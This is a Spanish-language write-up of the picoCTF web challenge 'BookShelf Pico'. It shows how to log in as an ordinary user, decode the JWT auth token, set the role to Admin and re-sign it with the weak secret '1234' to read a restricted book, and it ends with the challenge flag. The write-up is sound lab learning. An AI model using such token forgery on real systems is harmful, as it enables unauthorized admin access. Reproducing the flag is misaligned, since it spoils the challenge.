## Objetivo
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/483/bookshelf-pico.zip). Website can be accessed [here!](http://saturn.picoctf.net:65037/).
## Solución
Entramos a la pagina e iniciamos sesion con las credenciales que nos dan
Despues no dirigimos al libro que tiene la bandera, al cual no podemos acceder por no somos admin.
Posteriormente inspeccionamos el almacen de la solicitud y copiamos el auth-token:

![[Pasted image 20241019235258.png]]

Decodificamos el token y cambiamos unos valores
```bash

{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:DATA

{

  "role": "Admin",

  "iss": "bookshelf",

  "exp": 1730007788,

  "iat": 1729402988,

  "userId": 2,

  "email": "admin"

}
VERIFY SIGNATURE

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234
)
```
Copiamos el nuevo token y lo reemplazamos por el anterior. De igual forma reemplazamos los valores de token payload.
![[Pasted image 20241019235707.png]]

Refrescamos la pagina y deberíamos poder acceder al libro que contiene la bandera

![[Pasted image 20241020000236.png]]


```
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_42f5774a}
```
## Notas Adicionales

## Referencias
https://jwt.io/